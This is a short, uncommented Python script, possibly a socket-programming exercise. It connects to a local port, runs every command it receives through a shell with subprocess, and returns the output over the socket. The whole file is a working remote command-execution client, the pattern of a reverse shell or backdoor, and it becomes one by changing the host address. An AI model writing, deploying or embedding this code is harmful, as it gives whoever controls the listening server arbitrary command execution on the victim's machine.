import socket
import subprocess
ck=socket.socket()
ck.connect(('127.0.0.1',10050))
while True:
    cmd=ck.recv(4096).decode('gbk')

    pro_cmd=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

    std_out='stdout-->'+(pro_cmd.stdout.read()).decode('gbk')
    std_err='stderr-->'+(pro_cmd.stderr.read()).decode('gbk')
    ck.send(std_out.encode('utf-8'))
    ck.send(std_err.encode('utf-8'))
ck.close()
